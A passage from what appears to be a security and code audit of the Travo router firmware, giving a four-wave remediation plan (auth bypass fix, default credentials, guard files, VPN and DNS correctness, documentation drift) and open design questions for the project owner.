hand-maintained index wrong about 12 entries teaches readers to distrust it); ADR 0011 (a good,
well-reasoned decision that says outright it "changes no runtime behaviour" — it is a
`docs/development.md` section); `docs/_archive/requirements_done.md` (an archive inside an archive
that `tasks_done.md` already supersedes); and once the journal lands, two of the three copies of the
guard list.

---

# Suggested remediation order

Dependency-ordered, so each wave is independently shippable.

**Wave 0 — today, no design decisions needed**
1. `CaseSensitive: true` + move auth and the IP allowlist onto the route group; add the
   route-table auth test. *(Closes 0.1, 0.2 and the whole bypass class.)*
2. Shipped credentials: AdGuard random-at-install, installer refuses a default root password.
3. `install.sh` must verify the service started before printing success.
4. Document as a release blocker: any device exposed on a LAN since the auth middleware landed
   should be assumed to have an attacker-installed `/etc/dropbear/authorized_keys` entry.

**Wave 1 — safety invariants, one day each**
5. Auto-reconnect `mkdir -p` + `set -e`; toggle-helper snapshot-before-commit.
6. Guards deleted on failure paths: USB tether, and `SetConfig`'s bogus pre-mutation restore.
7. `deleteManagedSections` narrowed to `travo_*`; a test seeding a foreign mwan3 interface.
8. Firmware/restore: archive member allowlist, `os.CreateTemp`, `supported_devices` check.

**Wave 2 — correctness**
9. `SetRadioRole` "both" routed through the repeater reconcile; handler returns
   `wifiMutationResponse`; server-side confirm verification.
10. VPN DNS snapshot written only when absent, with a tunnel-down reconcile.
11. AdGuard `SetDNS` snapshot/restore parity with VPN; `SetConfig` YAML validation; redact
    `users[].password` from the GET.
12. DoH: implement it or hide the card and add a backlog entry.
13. Frontend: error-vs-absent states via one shared `QueryCard`; DHCP/DNS forms gated on data;
    confirmation on Service Remove and WiFi Schedule; multi-band AP rollback.

**Wave 3 — durability of the record**
14. The doc-drift fixes above, plus a markdown guard test: grep `docs/**/*.md` and `AGENTS.md`
    for `-in-progress` paths not under `/etc/trafo/` and for `travo.db` not under `/etc/travo/`.
15. Test-fidelity fixes: reusable UCI fake with list semantics, failover `initScript` seam,
    guard-list consistency test, drop `--passWithNoTests`, add coverage thresholds.
16. Mark the remediation plan honestly, or delete it — a plan with false `[x]` marks is worse than
    no plan.

**Explicitly not recommended without a decision first:** codegen for `shared/`, the resolver
reconciler, and the operation journal. They are the right long-term moves (see Architecture), but
each is a design change that deserves its own plan, not a patch.

---

# Open questions for the owner

1. **Was Travo's `allow_ap_on_sta_radio` escape hatch ever meant to be reachable from the UI?**
   `SetRadioRole("both")` bypasses it. Fix by routing through the reconcile, or by rejecting the
   role outright?
2. **Does "delete every mwan3 `interface` section" reflect a product decision** that Travo owns mwan3
   wholesale on this device? If yes, ADR 0005 §1 needs rewriting and its "manual edits inside
   `travo_` sections may be overwritten" note is misleading. If no, it is a one-line narrowing.
3. **Should the kill switch be owned by the VPN toggle or by the user?** The
   `travo_owner=vpn_toggle` machinery exists but no code writes it, so today's behaviour is
   "user-owned forever, survives disable" with no UI warning.
4. **Split-tunnel + kill switch silently negate each other** — the switch REJECTs everything to
   `wan`, which is exactly what custom split routes send traffic to. Intended?
5. **Is `dest=wan` sufficient for the kill switch?** An uplink in a custom zone escapes it while
   the UI says "All traffic is blocked".
6. **What is the intended multi-band AP write contract?** Client-side rollback, a backend batch
   endpoint, or per-band sequential UI with explicit per-band status? Three different costs, and it
   affects three screens.
7. **Was the repeater wizard deliberately removed from the Connect page, or orphaned by a
   refactor?** Mount it, or delete the folder and correct the plan and the archive?
8. **Is "Emergency AP" a planned feature or LuCI copy?** Either way the lockout copy must not
   point at it until it exists.
9. **Should 2FA and automatic updates be recorded as decisions rather than backlog items?** The
   code is hardened to an unusual standard elsewhere (monotonic sessions, sticky clock gate, Origin
   checks, persisted revocation); the absence of a second factor on a device exposed to hostile
   Wi-Fi is currently undocumented rather than argued.
10. **When does multi-WAN failover get validated on hardware?** It is the feature that makes the
    device usable across countries, it has never run on two uplinks, and it is not a backlog item.